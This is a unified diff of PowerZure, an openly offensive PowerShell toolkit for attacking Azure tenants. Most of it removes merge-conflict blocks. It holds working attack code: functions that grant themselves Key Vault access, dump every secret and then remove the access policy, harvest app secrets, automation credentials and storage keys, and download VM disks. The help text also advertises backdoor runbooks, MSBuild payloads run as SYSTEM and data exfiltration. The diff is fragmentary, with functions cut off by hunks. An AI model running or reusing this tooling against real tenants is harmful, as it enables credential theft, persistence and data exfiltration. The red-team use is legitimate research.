@@ -1,77 +1,4 @@
 ﻿Set-ExecutionPolicy Bypass
-<<<<<<< Updated upstream
-#Version Check
-$ErrorActionPreference = "Stop"
-$Version = $PSVersionTable.PSVersion.Major
-If ($Version -lt 5)
-{
-    Write-Host "Az requires at least PowerShell 5.1"
-}
-#Module Check
-$Modules = Get-InstalledModule
-If ($Modules.Name -contains 'Az')
-{
-}
-Else
-{
-    Write-Host "Az Module not installed. Installing."
-    #This installs the Az module
-    Install-Module -Name Az -AllowClobber
-    #This installs the Az CLI modules
-    Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'
-    $directory = pwd
-    #After installing the modules, PS needs to be restarted and PowerZure needs to be reimported.
-    Start-Process powershell.exe -argument "-noexit -command ipmo '$directory\PowerZure.ps1'"
-    #Killing old PS window
-    Stop-Process -Id $PID
-}
-#Login Check
-$ErrorActionPreference = "silentlyContinue"
-Write-Host @'
-                                                                                                                          
-8888888b.                                              8888888888P                           
-888   Y88b    ________                                       d88P                            
-888    888  /\  ___   \                                     d88P                             
-888   d88P /  \/   \   \ 888  888  888  .d88b.  888d888   d88P    888  888 888d888  .d88b.  
-8888888P"     | # # |    888  888  888 d8P  Y8b 888P"    d88P     888  888 888P"   d8P  Y8b 
-888        |  |     |\ | 888  888  888 88888888 888     d88P      888  888 888     88888888 
-888            \_ _/  \  Y88b 888 d88P Y8b.     888    d88P       Y88b 888 888     Y8b.     
-888         \_________/   "Y8888888P"   "Y8888  888   d8888888888  "Y88888 888      "Y8888                                                                                                                      
-                                                                                                                   
-'@ 
-Try
-{  
-    $User = az ad signed-in-user show --query '[userPrincipalName]' -o tsv
-    if ($User.Length -gt 1)
-    {                                                   
-    $Id = az ad signed-in-user show --query '[objectId]' -o tsv
-    Write-Host "Welcome $User"
-    Write-Host ""
-    Write-Host "Please set your default subscription with 'Set-Subscription -Id {id}' or 'az account set --subscription {id}' if you have multiple subscriptions."
-    Write-Host ""
-    Write-Host "Here are your roles and subscriptions:"
-    Write-Host ""
-	az role assignment list --all --query "[?principalName=='$User'].{Scope:scope,Role:roleDefinitionName}" -o table
-    Write-Host ""
-    Write-Host "Here are the AD groups you belong to:"
-    Write-Host ""
-    az ad user get-member-groups --id $Id -o table
-    Write-Host ""
-    Write-Host "Try PowerZure -h for a list of functions"
-    Write-Host ""
-    }
-    else
-    {
-    Write-Host "Please login via az login"
-    }
-
-}
-Catch
-{
-    Write-Host "Please login via az login"
-}
-=======
->>>>>>> Stashed changes
 
 function Get-AzureGraphToken
 {
@@ -138,67 +65,6 @@ function PowerZure
     if($h -eq $true)
     {
             Write-Host @"
-<<<<<<< Updated upstream
-
-                             PowerZure Version 1.0
-
-                               List of Functions
-
-
---Role Needed-- ------------------Mandatory ----------------
-
-Reader          Set-Subscription - Sets the default Subscription to operate in
-
-                ------------------Operational --------------
-
-Contributor     Execute-Command - Will run a command on a specified VM
-Contributor     Execute-MSBuild - Will run a supplied MSBuild payload on a specified VM. By default, Azure VMs have .NET 4.0 installed. Requires Contributor Role. Will run as SYSTEM.
-Contributor     Execute-Program - Executes a supplied program. 
-Administrator   Create-Backdoor - Will create a Runbook that creates an Azure account and generates a Webhook to that Runbook so it can be executed if you lose access to Azure. 
-                Also gives the ability to upload your own .ps1 file as a Runbook (Customization)
-                This requires an account that is part of the 'Administrators' Role (Needed to make a user)
-Administrator   Execute-Backdoor - This runs the backdoor that is created with "Create-Backdoor". Needs the URI generated from Create-Backdoor
-Contributor     Upload-StorageContent - Uploads a supplied file to a storage share.
-Contributor     Stop-VM - Stops a VM
-Contributor     Start-VM - Starts a VM
-Contributor     Restart-VM - Restarts a VM
-Contributor     Start-Runbook - Starts a specific Runbook
-Owner           Set-Role - Adds a user to a role for a resource or a subscription
-Owner           Remove-Role -Removes a user from a role on a resource or subscription
-Administrator   Set-Group - Adds a user to an Azure AD group
-
-
-                ------------------Info Gathering -------------
-
-Reader			Get-Targets - Compares your role to your scope to determine what you have access to and what kind of access it is (Read/write/execute).	
-Reader          Get-CurrentUser - Returns the current logged in user name, their role + groups, and any owned objects
-Reader          Get-AllUsers - Lists all users in the subscription
-Reader          Get-User - Gathers info on a specific user
-Reader          Get-AllGroups - Lists all groups + info within Azure AD
-Reader          Get-Resources - Lists all resources in the subscription
-Reader          Get-Apps - Lists all applications in the subscription
-Reader          Get-GroupMembers - Gets all the members of a specific group. Group does NOT mean role.
-Reader          Get-AllGroupMembers - Gathers all the group members of all the groups.
-Reader          Get-AllRoleMembers - Gets all the members of all roles. Roles does not mean groups.
-Reader          Get-RoleMembers -  Gets the members of a role 
-Reader          Get-Roles - Gets the roles of a user
-Reader          Get-ServicePrincipals - Returns all service principals
-Reader          Get-ServicePrincipal - Returns all info on a specified service principal
-Reader          Get-Apps - Returns all applications and their Ids
-Reader          Get-AppPermissions - Returns the permissions of an app
-Reader          Get-WebApps - Gets running webapps
-Reader          Get-WebAppDetails - Gets running webapps details
-
-                ---------Secret/Key/Certificate Gathering -----
-            
-Reader          Get-KeyVaults - Lists the Key Vaults
-Contributor     Get-KeyVaultContents - Get the keys, secrets, and certificates from a specific Key Vault
-Contributor     Get-AllKeyVaultContents - Gets ALL the keys, secrets, and certificates from all Key Vaults. If the logged in user cannot access a key vault, It tries to 
-Contributor     Get-AppSecrets - Returns the application passwords or certificate credentials
-Contributor     Get-AllAppSecrets - Returns all application passwords or certificate credentials (If accessible)
-Contributor     Get-AllSecrets - Gets ALL the secrets from all Key Vaults and applications. If the logged in user cannot access a key vault or application, it ignores the error and trys the other ones. Errors are suppressed.
-Contributor     Get-AutomationCredentials - Gets the credentials from any Automation Accounts
-=======
 			
 			  PowerZure Version 1.2
 
@@ -252,20 +118,21 @@ Get-WebAppDetails ------ Gets running webapps details
 Get-RunAsCertificate --- Gets the login credentials for an Automation Accounts "RunAs" service principal
 Get-AADRoleMembers ----- Lists the active roles in Azure AD and what users are part of the role
 Get-RunAsAccounts ------ Finds any RunAs accounts being used by an Automation Account
->>>>>>> Stashed changes
            
-                -----------------Data Exfiltration--------------
-            
-Reader          Get-StorageAccounts - Gets all storage accounts
-Contributor     Get-StorageAccountKeys -  Gets the account keys for a storage account
-Reader          Get-StorageContents - Gets the contents of a storage container or file share. OAuth is not support to access file shares via cmdlets, so you must have access to the Storage Account's key.
-Reader          Get-Runbooks - Lists all the Runbooks
-Reader          Get-RunbookContent - Reads content of a specific Runbook
-Reader          Get-AvailableVMDisks -  Lists the VM disks available. 
-Contributor     Get-VMDisk - Generates a link to download a Virtual Machiche's disk. The link is only available for an hour.
-Reader          Get-VMs - Lists available VMs      
-
-
+-----------------Data Exfiltration--------------
+Get-KeyVaults ---------- Lists the Key Vaults
+Get-KeyVaultContents --- Get the keys, secrets, and certificates from a specific Key Vault
+Get-AllKeyVaultContents -Gets ALL the keys, secrets, and certificates from all Key Vaults. If the logged in user cannot access a key vault, It tries to           
+Get-StorageAccounts ---- Gets all storage accounts
+Get-StorageAccountKeys - Gets the account keys for a storage account
+Get-StorageContents ---- Gets the contents of a storage container or file share. OAuth is not support to access file shares via cmdlets, so you must have access to the Storage Account's key.
+Get-Runbooks ----------- Lists all the Runbooks
+Get-RunbookContent ----- Reads content of a specific Runbook
+Get-AvailableVMDisks --  Lists the VM disks available. 
+Get-VMDisk ------------- Generates a link to download a Virtual Machiche's disk. The link is only available for an hour.
+Get-VMs ---------------- Lists available VMs     
+Get-SQLDBs ------------- Lists all SQL Servers and their Databases + Administrator usernames
+			
 "@
 
         }
@@ -365,22 +232,6 @@ Powerzure -Checks -Banner -Welcome
 
 function Show-AzureCurrentUser
 {
-<<<<<<< Updated upstream
-<# 
-.SYNOPSIS
-    List all Azure users in the tenant
-.PARAMETER
-    OutFile (.csv is special)
-.EXAMPLE
-    Get-AzureUsers
-    Get-AzureUsers -OutFile users.csv
-    Get-AzureUsers -OutFile users.txt
-#>
-
-    [CmdletBinding()]
-     Param(
-        [Parameter(Mandatory=$false)][String]$OutFile = $null)    
-=======
     $APSUser = Get-AzContext
     $Headers = Get-AzureGraphToken
     if($APSUser)
@@ -423,7 +274,6 @@ function Show-AzureCurrentUser
 			$groupstuff= Get-AzADGroup -Objectid $groupid
 			$grouparray += $groupstuff.DisplayName
 		}
->>>>>>> Stashed changes
 
 		$obj | Add-Member -MemberType NoteProperty -Name Groups -Value $grouparray		
 		$obj
@@ -435,9 +285,6 @@ function Show-AzureCurrentUser
     }  
 }
 
-<<<<<<< Updated upstream
-function Get-User 
-=======
 function Set-AzureSubscription
 {
 <# 
@@ -456,7 +303,6 @@ function Set-AzureSubscription
 }
 
 function Get-AzureADRoleMember
->>>>>>> Stashed changes
 {
 <# 
 .SYNOPSIS
@@ -465,13 +311,9 @@ function Get-AzureADRoleMember
 	-All (Lists all roles, even those without a user in them)
     -Role (Specific role)
 .EXAMPLE
-<<<<<<< Updated upstream
-    Get-AzureUser -User Test@domain.com
-=======
 	Get-AzureADRoleMember -Role 'Company Administrator'
     Get-AzureADRoleMember -Role '4dda258a-4568-4579-abeb-07709e34e307'
 	Get-AzureADRoleMember -All
->>>>>>> Stashed changes
 #>
     [CmdletBinding()]
     Param(
@@ -532,81 +374,17 @@ function Get-AzureADRoleMember
             $obj | fl
         }  
     }
-<<<<<<< Updated upstream
-}
-
-function Get-AllGroups 
-{
-<# 
-.SYNOPSIS
-    Gathers all the groups in the tenant
-.PARAMETERS
-    OutFile (.csv is special)
-.EXAMPLE
-    Get-AzureGroups
-    Get-AzureGroups -OutFile users.csv
-    Get-AzureGroups -outFile users.txt
-#>
-
-    [CmdletBinding()]
-     Param(
-        [Parameter(Mandatory=$false)][String]$OutFile = $null)    
-=======
     If(!$All -and !$Role)
     {
         Write-Host "Usage:" -ForegroundColor Red
         Write-Host "Get-AzureADRoleMember -Role '4dda258a-4568-4579-abeb-07709e34e307'" -ForegroundColor Red
         Write-Host "Get-AzureADRoleMember -All" -ForegroundColor Red
         Write-Host "Get-AzureADRoleMember -Role 'Company Administrator'" -ForegroundColor Red
->>>>>>> Stashed changes
 
     }
 }
 
-<<<<<<< Updated upstream
-function Get-Apps 
-{
-<# 
-.SYNOPSIS
-    Gathers all the application in Azure 
-.PARAMETERS
-    OutFile (.csv is special)
-.EXAMPLE
-    Get-AzureApps
-    Get-AzureApps -OutFile users.csv
-    Get-AzureApps -outFile users.txt
-#>
-
-    [CmdletBinding()]
-     Param(
-        [Parameter(Mandatory=$false)][String]$OutFile = $null)    
-
-    $split = $OutFile.Split(".")
-    $type = $split[-1]
-    $name = $split[0]
-    If($type -eq "csv")
-    {
-        $i= az ad app list -o json | ConvertFrom-Json
-        $i | export-csv $OutFile
-    } 
-    else
-    {
-        If($Outfile)
-        {
-         $i=az ad app list --query='[].{Name:displayName,URL:homepage}' -o yaml | Out-File $OutFile
-        }
-        else 
-        {
-         az ad app list --query='[].{Name:displayName,URL:homepage,id:objectId}' -o yaml
-        }
-	}
-    
-}
-
-function Get-GroupMembers 
-=======
 function Get-AzureUser
->>>>>>> Stashed changes
 {
 <# 
 .SYNOPSIS
@@ -617,14 +395,8 @@ function Get-AzureUser
 	-All (Switch)
 
 .EXAMPLE
-<<<<<<< Updated upstream
-    Get-AzureGroupMembers -Group 'SQL Users'
-    Get-AzureGroupMembers -Group 'SQL Users' -OutFile users.csv
-    
-=======
     Get-AzureUser -Username Test@domain.com
 	Get-AzureUser -All
->>>>>>> Stashed changes
 #>
     [CmdletBinding()]
     Param(
@@ -738,13 +510,8 @@ function Get-AzureGroupMember
 	-All (List all group members of all groups)
 
 .EXAMPLE
-<<<<<<< Updated upstream
-    Get-AllAzureGroupMembers -OutFile members.txt
-    
-=======
 	Get-AzureGroupMember -Group 'Sql Admins'
 	Get-AzureGroupMember -All 
->>>>>>> Stashed changes
 #>
     [CmdletBinding()]
     Param(
@@ -810,48 +577,6 @@ function Add-AzureADGroup
 
 function Add-AzureADRole
 {
-<<<<<<< Updated upstream
-<# 
-.SYNOPSIS
-    Gets all the members of all roles. Roles does not mean groups.
-
-.PARAMETERS
-    OutFile (.csv is special)
-.EXAMPLE
-    Get-AllAzureRoleMembers
-    Get-AllAzureRoleMembers -OutFile users.csv
-    Get-AllAzureRoleMembers -outFile users.txt
-#>
-
-    [CmdletBinding()]
-    Param(
-    [Parameter(Mandatory=$false)][String]$OutFile = $null)    
-
-    $split = $OutFile.Split(".")
-    $type = $split[-1]
-    $name = $split[0]
-    If($type -eq "csv")
-    {
-        $i= az role assignment list --all -o json | ConvertFrom-Json
-        $i | export-csv $OutFile
-        $e=az role assignment list --include-classic-administrators true -o table | Out-File -Append $OutFile
-        $e | Out-File -Append $OutFile
-    } 
-    else
-    {
-        If($Outfile)
-        {
-         $i=az role assignment list --all --query '[].{Role:roleDefinitionName,Name:principalName,Type:principalType}' -o table 
-         $i | Out-File $OutFile
-         $e=az role assignment list --include-classic-administrators true -o table 
-         $e | Out-File -Append $OutFile
-        }
-        else 
-        {
-        az role assignment list --include-classic-administrators true -o table
-        Write-Host ""
-        az role assignment list --all --query '[].{Principal:principalName,Role:roleDefinitionName,Type:principalType}' -o table
-=======
  <#
 .SYNOPSIS
     Adds a role to a user in AzureAD
@@ -892,7 +617,6 @@ $body = @"
             {
                 Write-Host "Successfully added $Username to $Role" -ForegroundColor Green
             }
->>>>>>> Stashed changes
         }
         If($RoleID)
         {
@@ -903,29 +627,6 @@ $body = @"
 $body = @"
 {	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UsersId"
 }
-<<<<<<< Updated upstream
-
-function Get-Roles
-{
-<# 
-.SYNOPSIS
-    Lists the roles of a specific user.
-
-.PARAMETER 
-    -User (john@contoso.com)
-
-.EXAMPLE
-    Get-Rolesr -User john@contoso.com
-#>
-    [CmdletBinding()]
-    Param(
-    [Parameter(Mandatory=$false)][String]$User = $null)
-    
-    If($User -eq "") 
-    {
-        Write-Host  "Requires a username in the format of 'user@domain.com'" -ForegroundColor Red
-        Write-Host  "Usage: Get-Roles -User Test@domain.com" -ForegroundColor Red
-=======
 "@
 	        $req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
             If($req -eq "")
@@ -933,7 +634,6 @@ function Get-Roles
                 Write-Host "Successfully added $Username to $RoleID" -ForegroundColor Green
             }
         }
->>>>>>> Stashed changes
     }
     If($UserId)
     {
@@ -946,30 +646,6 @@ function Get-Roles
 $body = @"
 {	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UserId"
 }
-<<<<<<< Updated upstream
-
-function Get-RoleMembers  
-{
-<# 
-.SYNOPSIS
-    Gets the members of a role. Capitalization matters (i.e. reader vs Reader <---correct)
-
-.PARAMETER 
-    -Role
-
-.EXAMPLE
-    Get-RoleMembers Reader
-    
-#>
-    [CmdletBinding()]
-    Param(
-    [Parameter(Mandatory=$false)][String]$Role = $null)
-
-    if($Role -eq "")
-    {
-        Write-Host  "Requires a role" -ForegroundColor Red
-        Write-Host  "Usage: Get-RoleMembers Reader" -ForegroundColor Red
-=======
 "@
 	        $req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri
             If($req -eq "")
@@ -991,7 +667,6 @@ $body = @"
                 Write-Host "Successfully added $UsedID to $RoleID"
             }
         }
->>>>>>> Stashed changes
     }
     If(!$Role -and $RoleId -and !$Username -and !$UserId)
     {
@@ -1273,307 +948,12 @@ function Show-AzureStorageContent
 
 }
 
-<<<<<<< Updated upstream
-function Get-ServicePrincipal
-{
-<#
-.SYNOPSIS
-    Returns all info on a service principal
-.PARAMETER
-    -Id (Id of SP)
-.EXAMPLE
-    Get-ServicePrincipal --id fdb54b57-a416-4115-8b21-81c73d2c2deb
-#>
-    
-        [CmdletBinding()]
-        Param(
-        [Parameter(Mandatory=$false)][String]$Id = $null)
-        
-     if($Id -eq "")
-     {
-        Write-Host "Requires Service Principal Id" -ForegroundColor Red
-        Write-Host "Usage example: Get-ServicePrincipal --id fdb54b57-a416-4115-8b21-81c73d2c2deb" -ForegroundColor Red
-     }
-     else
-     {
-        
-        az ad sp show --id $Id
-     }
-}
-
-function Get-Apps
-=======
 function Get-AzureStorageContent
->>>>>>> Stashed changes
 {
 <#
 .SYNOPSIS
     Gathers a file from a specific blob or File Share
 
-<<<<<<< Updated upstream
-}
-
-function Get-AppPermissions
-{
-<#
-.SYNOPSIS
-    Returns the permissions of an app
-.PARAMETER
-    -Id 
-.EXAMPLE
-    Get-AppPermissions -Id fdb54b57-a416-4115-8b21-81c73d2c2deb
-#>
-        [CmdletBinding()]
-         Param(
-        [Parameter(Mandatory=$false)][String]$Id = $null)
-
-     if($Id -eq "")
-     {
-        Write-Host "Requires Application Id" -ForegroundColor Red
-        Write-Host "Usage example: Get-AppPermissions --id fdb54b57-a416-4115-8b21-81c73d2c2deb" -ForegroundColor Red
-     }
-     else
-     {
-
-        az ad app permission list --id $Id
-     }
-}
-
-function Get-AppSecrets
-{
-<#
-.SYNOPSIS
-    Returns the application passwords or certificate credentials
-.PARAMETER
-    Name of App
-.EXAMPLE
-    Get-AppSecrets
-#>
-        [CmdletBinding()]
-         Param(
-         [Parameter(Mandatory=$false)][String]$Id = $null)
-         if($Id -eq "")
-         {
-            Write-Host "Requires Application Id" -ForegroundColor Red
-            Write-Host "Usage example: Get-AppSecrets --id fdb54b57-a416-4115-8b21-81c73d2c2deb" -ForegroundColor Red
-         }
-         else
-         {
-
-            az ad app credential list --id $Id
-         }
-}
-
-function Get-AllAppSecrets
-{
-<#
-.SYNOPSIS
-    Returns all application passwords or certificate credentials (If accessible)
-#>
-
-    $ErrorActionPreference = "SilentlyContinue"
-    $ids=az ad app list --query='[].{id:objectId}' -o tsv
-    ForEach ($id in $ids){
-                 az ad app credential list --id $id | ConvertFrom-Json
-                    }
-        
-}
-
-function Get-AllSecrets 
-{
-<# 
-.SYNOPSIS
-    Gets ALL the secrets from all Key Vaults and applications. If the logged in user cannot access a key vault or application, it ignores the error and trys the other ones. Errors are suppressed.
-
-#>
-    Write-Host "Gathering all keys from key vaults, this may take a moment"
-    $vaults = az keyvault list --query '[].name' -o tsv
-    $User = az ad signed-in-user show --query '[userPrincipalName]' -o tsv
-    ForEach ($vault in $vaults)
-    {
-		$access = az keyvault set-policy --name $vault --upn $User --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
-            if(!$access)
-            {
-               Write-Host "Couldn't change permissions on the Key Vault. Are you Global Contributor?"
-               continue
-            }
-        $ids = az keyvault secret list --vault-name $vault --query '[].id' -o tsv
-		$kids = az keyvault key list --vault-name $vault --query '[].id' -o tsv
-		$cids = az keyvault certificate list --vault-name $vault --query '[].id' -o tsv
-		ForEach ($i in $ids)
-		{
-			Write-Host "Vault: " $i
-			az keyvault secret show --id $i -o table
-			Write-Host ""
-		}
-		ForEach ($kid in $kids)
-		{
-			Write-Host "Vault: " $kid
-			az keyvault secret show --id $kid -o table
-			Write-Host ""
-		}
-		ForEach ($cid in $cids)
-		{
-			Write-Host "Vault: " $cid
-			az keyvault secret show --id $cid -o table
-			Write-Host ""
-		}
-		$removeaccess = az keyvault delete-policy --name $vault --upn $User
-    }
-    Write-Host ""
-    Write-Host "Gathering all secrets from applications, this may take a moment"    
-    $ids=az ad app list --query='[].{id:objectId}' -o tsv
-    ForEach ($id in $ids){
-                 az ad app credential list --id $id | ConvertFrom-Json
-                    } 
-    Write-Host ""
-    Write-Host "Listing Automation Account Credentials. Unforunately passwords are abstraced :("
-    $Data = Get-AzAutomationAccount
-    $RG = $Data.ResourceGroupName
-    $AA = $Data.AutomationAccountName
-    Get-AzAutomationCredential -AutomationAccountName $AA -ResourceGroupName $RG
-
-}
-
-function Get-WebApps
-{
-<#
-.SNYOPSIS 
-    Gets running webapps
-#>
-    az webapp list --query "[?state=='Running']"
-}
-
-function Get-WebAppDetails
-{
-<#
-.SYNOPSIS 
-    Gets running webapps details
-.PARAMETER
-    -Name (of webapp)
-.EXAMPLE
-    Get-WebAppDetails WebAppName
-#>
-        [CmdletBinding()]
-         Param(
-        [Parameter(Mandatory=$false)][String]$Name = $null)
-
-         if($Name -eq "")
-         {
-            Write-Host "Requires WebApp Name" -ForegroundColor Red
-            Write-Host "Usage example: Get-WebAppDetails -Name WebAppName" -ForegroundColor Red
-         }
-         else
-         {
-        
-             az webapp show --name $name
-         }
-}
-
-function Get-StorageAccounts
-{
-<#
-.SYNOPSIS 
-    Gets storage blobs 
-#>
-    az storage account list --query '[].{Name:name,URL:primaryEndpoints.blob}' -o table
-}
-
-function Get-StorageContents
-{
-<#
-.SYNOPSIS 
-    Gets the contents of a storage container or file share. OAuth is not support to access file shares via cmdlets, so you must have access to the Storage Account's key.
-.PARAMETER
-    -ResourceGroup
-    -StorageAccount (Name of Storage account. Try Get-StorageAccounts for a list.)
-    -File (Gets the contents of a specified file. If file is in a path, include the full path. Optional)
-    -NoDelete (Doesn't delete the file after it's downloaded. Optional)
-.EXAMPLE
-    Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup
-    Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File secret.txt -NoDelete
-    Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File /path/to/secret.txt
-    
-#>
-     [CmdletBinding()]
-     Param(
-     [Parameter(Mandatory=$false)][String]$ResourceGroup = $null,
-     [Parameter(Mandatory=$false)][String]$File = $null,
-     [Parameter(Mandatory=$false)][Switch]$NoDelete = $null,
-     [Parameter(Mandatory=$false)][String]$StorageAccount = $null)
-
-     If($ResourceGroup -eq "")
-     {
-            Write-Host "Requires Resource Group name" -ForegroundColor Red
-            Write-Host "Usage example: Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File secret.txt -NoDelete" -ForegroundColor Red
-            Write-Host "               Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File /path/to/secret.txt" -ForegroundColor 
-            Write-Host "               Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup" -ForegroundColor Red
-
-     }
-     elseif($StorageAccount -eq "")
-     {
-            Write-Host "Requires Storage Account name" -ForegroundColor Red
-            Write-Host "Usage example: Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File secret.txt -NoDelete" -ForegroundColor Red
-            Write-Host "               Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup -File /path/to/secret.txt" -ForegroundColor 
-            Write-Host "               Get-StorageContents -StorageAccount TestName -ResourceGroup TestGroup" -ForegroundColor Red
-     }
-     else
-     {
-     
-         $keys = az storage account keys list -g $ResourceGroup -n $StorageAccount --query '[].{key:value}' -o tsv
-         $split = $keys.Split([Environment]::NewLine)
-         $key = $split[0]
-         $Context = New-AzStorageContext -StorageAccountName $StorageAccount -StorageAccountKey $key
-         $Things = Get-AzStorageShare -Context $Context
-         $Shares = $Things.Name
-
-         Foreach($Share in $Shares)
-         {
- 
-           if($File)
-           {
-             $Splitted = $File.Split("/")
-             $Filename = $Splitted[-1]
-             cat $Filename
-             if($NoDelete -eq $true)
-             {
-                Get-AzStorageFileContent -Path $File -ShareName $Share -Context $Context
-                cat $Filename
-             }
-             else
-             {
-                Get-AzStorageFileContent -Path $File -ShareName $Share -Context $Context
-                cat $Filename
-                rm $Filename
-             }  
-           }
-           else
-           {
-                Write-Host "Enumerating $Share"   
-                Write-Host "------------------"  
-                Get-AzStorageFile -ShareName $Share -Context $Context
-           }
-         }
-     }
-}
-
-function Upload-StorageContent
-{
-<#
-.SYNOPSIS 
-    Uploads a supplied file to a storage share.
-.PARAMETER
-    
-    -StorageAccount (Name of Storage account. Try Get-StorageAccounts for a list.)
-    -File (Gets the contents of a specified file. If file is in a path, include the full path. Optional)
-    -Share (Share name to upload to)
-.EXAMPLE
-    
-    Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt
-    
-    
-#>
-=======
 .PARAMETER
     Share - Name of the share the file is located in 
     Path - Path of the file in the target share
@@ -1586,99 +966,11 @@ function Upload-StorageContent
     Get-AzureStorageContent
     Get-AzureStorageContent -StorageAccountName TestAcct -Type Container 
 #>
->>>>>>> Stashed changes
      [CmdletBinding()]
      Param(
      [Parameter(Mandatory=$true)][String]$StorageAccountName = $null,
      [Parameter(Mandatory=$true)][String]$ResourceGroup = $null,
      [Parameter(Mandatory=$false)][String]$Share = $null,
-<<<<<<< Updated upstream
-     [Parameter(Mandatory=$false)][String]$ResourceGroup = $null,
-     [Parameter(Mandatory=$false)][String]$StorageAccount = $null)
-     If($StorageAccount -eq "")
-     {
-            Write-Host "Requires Storage account name" -ForegroundColor Red
-            Write-Host "Usage Example: Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt" -ForegroundColor Red
-     }
-     elseif($Share -eq "")
-     {
-            Write-Host "Requires Share name" -ForegroundColor Red
-            Write-Host "Usage Example: Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt" -ForegroundColor Red
-     }
-     elseif($File -eq "")
-     {
-            Write-Host "Requires File name" -ForegroundColor Red
-            Write-Host "Usage Example: Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt" -ForegroundColor Red
-     }
-     elseif($ResourceGroup -eq "")
-     {
-            Write-Host "Requires Resource Group name" -ForegroundColor Red
-            Write-Host "Usage Example: Upload-StorageContent -StorageAccount TestName -Share TestShare -File secret.txt" -ForegroundColor Red
-     }
-     else
-     {
-         $keys = az storage account keys list -g $ResourceGroup -n $StorageAccount --query '[].{key:value}' -o tsv
-         $split = $keys.Split([Environment]::NewLine)
-         $key = $split[0]
-         az storage file upload -s $Share --source $File --account-name $StorageAccount --account-key $key
-     }
-}
-
-function Get-StorageAccountKeys
-{
-<#
-.SYNOPSIS 
-    Gets the account keys for a storage account
-.PARAMETER
-    -group
-    -account 
-    -kerb (optional, use if kerberos keys are suspected)
-.EXAMPLE
-    Get-StorageAccountKeys -ResourceGroup MyGroup -Account StorageAccountName -kerb
-    
-#>
-     [CmdletBinding()]
-     Param(
-     [Parameter(Mandatory=$false)][String]$ResourceGroup = $null,
-     [Parameter(Mandatory=$false)][String]$Account = $null,
-     [Parameter(Mandatory=$false)][Switch]$kerb = $null)
-     if($ResourceGroup -eq "")
-     {
-        Write-Host "Requires Resource Group name" -ForegroundColor Red
-        Write-Host "Usage: Get-StorageAccountKeys -ResourceGroup MyGroup -Account StorageAccountName -kerb " -ForegroundColor Red
-
-     }
-     elseif($Account -eq "")
-     {
-        Write-Host "Requires Storage account name" -ForegroundColor Red
-        Write-Host "Usage: Get-StorageAccountKeys -ResourceGroup MyGroup -Account StorageAccountName -kerb " -ForegroundColor Red
-     }
-     else
-     {
-            if($kerb)
-             {
-             az storage account keys list -g $ResourceGroup -n $Account --expand-key-type kerb | ConvertFrom-Json
-             }
-             else
-             {
-             az storage account keys list -g $ResourceGroup -n $Account | ConvertFrom-Json
-             }
-     }
-}
-
-function Get-AvailableVMDisks
-{
-<#
-.SYNOPSIS 
-    Lists the VM disks available.      
-#>
-
- az disk list --query '[].{Name:name,Size:diskSizeGb,Encryption:encryption,OS:osType,Creation:timeCreated,Id:uniqueId}' -o table
-
-}
-
-function Get-VMDisk
-=======
      [Parameter(Mandatory=$false)][String]$Path = $null,
      [Parameter(Mandatory=$false)][String]$Blob = $null,
      [Parameter(Mandatory=$false)][String]$ContainerName = $null)
@@ -1695,7 +987,6 @@ function Get-VMDisk
 }
 
 function Get-AzureVMDisk
->>>>>>> Stashed changes
 {
 <#
 .SYNOPSIS 
@@ -1735,77 +1026,11 @@ function Get-AzureRunbookContent
     Get-AzureRunbookContent -All -OutFilePath 'C:\temp
 
 #>
-<<<<<<< Updated upstream
-        [CmdletBinding()]
-        Param(
-        [Parameter(Mandatory=$false)][String]$VM = $null,
-        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)
-
-     if($VM -eq "")
-     {
-        Write-Host "Requires VM name" -ForegroundColor Red
-        Write-Host "Usage: Restart-VM -VM Example2016R2 -ResourceGroup Test_RG" -ForegroundColor Red
-
-     }
-     elseif($ResourceGroup -eq "")
-     {
-        Write-Host "Requires Resource Group name" -ForegroundColor Red
-        Write-Host "Usage: Restart-VM -VM Example2016R2 -ResourceGroup Test_RG" -ForegroundColor Red
-     }
-     else
-     {
-
-        az vm restart -n $VM -g $ResourceGroup
-     }
-}
-
-function Get-AutomationCredentials 
-{
- <#
-.SYNOPSIS
-    Gets the credentials from any Automation Accounts
-.PARAMETER
-    -AutomationAccount (Name of Automation account)
-    -ResourceGroup (Resource group it's located in)
-.EXAMPLE
-    Get-AutomationCredentials -AutomationAccount Test-Account -ResourceGroup Test_RG
-#>
-        [CmdletBinding()]
-         Param(
-        [Parameter(Mandatory=$false)][String]$AutomationAccount = $null,
-        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)
-
-     if($ResourceGroup -eq "")
-     {
-        Write-Host "Requires Resource Group name" -ForegroundColor Red
-        Write-Host "Usage: Get-AutomationCredentials -AutomationAccount Test-Account -ResourceGroup Test_RG" -ForegroundColor Red
-     }
-     elseif($AutomationAccount -eq "")
-     {
-        Write-Host "Requires Automation Account name" -ForegroundColor Red
-        Write-Host "Usage: Get-AutomationCredentials -AutomationAccount Test-Account -ResourceGroup Test_RG" -ForegroundColor Red
-     }
-     else
-     {
-        Get-AzAutomationCredential -AutomationAccountName $AutomationAccount -ResourceGroupName $ResourceGroup
-     }
-
-}
-
-function Get-Runbooks
-{
- <#
-.SYNOPSIS
-    Lists all the run books
-#>
-    $accounts = Get-AzAutomationAccount
-=======
     [CmdletBinding()]
      Param(
     [Parameter(Mandatory=$false)][String]$Runbook = $null,
     [Parameter(Mandatory=$true)][String]$OutFilePath = $null,
     [Parameter(Mandatory=$false)][Switch]$All = $null)
